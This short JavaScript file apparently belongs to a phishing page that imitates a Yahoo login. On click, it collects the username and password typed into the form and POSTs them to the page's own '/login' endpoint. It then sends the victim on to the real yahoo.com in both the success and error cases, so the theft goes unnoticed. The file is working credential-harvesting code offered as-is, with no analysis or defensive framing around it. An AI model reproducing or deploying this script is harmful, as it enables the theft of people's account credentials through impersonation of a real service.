console.log('Thank you for chooosing Yahoo despite everything.')

var thisShit = function() {
  console.log('Thank you.')
  $.ajax({
    type: "POST",
    url: '/login',
    data: {
      username: document.querySelector('#login-username').value,
      password: document.querySelector('#login-password').value
    },
    success: success,
    error: error
  });
}

function success() {
  window.location=('https://yahoo.com')
}

function error() {
  window.location=('https://yahoo.com')
}

document.querySelector('#login').addEventListener('click', thisShit)
